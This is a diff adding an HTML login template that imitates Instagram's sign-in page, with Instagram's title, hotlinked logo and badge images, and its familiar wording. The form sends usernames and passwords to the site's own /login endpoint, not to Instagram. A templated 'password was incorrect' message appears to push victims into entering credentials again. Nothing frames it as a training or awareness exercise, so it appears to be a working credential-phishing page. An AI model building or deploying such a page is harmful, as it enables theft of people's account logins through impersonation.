@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Log in</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+            </div>
+            
+            {% if error %}
+            <div class="error-message">
+                Sorry, your password was incorrect. Please double-check your password.
+            </div>
+            {% endif %}
+            
+            <form action="/login" method="POST" class="login-form">
+                <div class="input-group">
+                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            
+            <div class="divider">
+                <div class="line"></div>
+                <div class="or">OR</div>
+                <div class="line"></div>
+            </div>
+            
+            <div class="facebook-login">
+                <div class="facebook-icon">
+                    <img src="https://www.instagram.com/static/images/icons/facebook-icon.svg/4be5087a5310.png" alt="Facebook">
+                </div>
+                <span>Log in with Facebook</span>
+            </div>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+        
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+        
+        <div class="app-download">
+            <p>Get the app.</p>
+            <div class="app-buttons">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc7e9.png" alt="Google Play">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180a7a04f16b.png" alt="App Store">
+            </div>
+        </div>
+    </div>
+    
+    <script src="/static/script.js"></script>
+</body>
+</html>
